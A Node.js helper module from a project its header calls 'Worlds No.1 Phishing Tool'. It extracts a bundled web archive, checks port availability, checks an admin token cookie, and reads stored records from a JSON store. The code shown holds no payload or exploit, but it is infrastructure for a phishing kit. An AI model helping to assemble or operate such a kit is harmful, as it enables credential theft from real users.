/**
 * 
 * @Author      : Madhan (Madhanmaaz) - madhan hacker
 * github       : https://github.com/madhanmaaz
 * website      : http://madhanmaaz.netlify.app/
 * Description  : Worlds No.1 Phishing Tool.
 * 
 */

const net = require('net')
const fs = require("fs")
const jsZip = require("jszip")
const { JSONStorage } = require("node-localstorage")
const ssd = new JSONStorage("./ssd")
const books = new JSONStorage("./ssd/books")

module.exports = {
    extractStaticFile: function () {
        let extPath = `${process.cwd()}/public`

        if (!fs.existsSync(`${extPath}/web`)) {
            fs.mkdirSync(`${extPath}/web`)

            let webZipFilePath = `${process.cwd()}/public/web.zip`
            let zipFile = fs.readFileSync(webZipFilePath)
            const zipApp = new jsZip()

            zipApp.loadAsync(zipFile).then(async archive => {
                const fileNames = Object.keys(archive.files)

                for (const fileName of fileNames) {
                    const file = archive.files[fileName];

                    if (!file.dir) {
                        const content = await file.async('nodebuffer')
                        fs.writeFileSync(`${extPath}/${fileName}`, content)
                    }
                }
            }).catch(err => {
                console.log("ERROR on extracting web file in ./public/web.zip. do it manually", err)
            })

            console.log("web.zip extracted success.")
        }
    },
    checkingPort: function (port) {
        return new Promise((resolve, reject) => {
            const server = net.createServer()

            server.once("error", err => {
                if (err.code == "EADDRINUSE") {
                    resolve(false)
                } else {
                    reject(err)
                }
            })

            server.once('listening', () => {
                server.close(() => {
                    resolve(true)
                })
            })

            server.listen(port)
        })
    },
    checkAdminToken: function (req, res, next) {
        const config = ssd.getItem("config.json")
        const token = req.cookies.token

        if (token != undefined && token == config.token) {
            next()
        } else {
            res.clearCookie("token")
            res.redirect("/")
        }
    },
    checkId: function (id) {
        return books.getItem(`${id}.json`)
    },
    ssd,
    books
}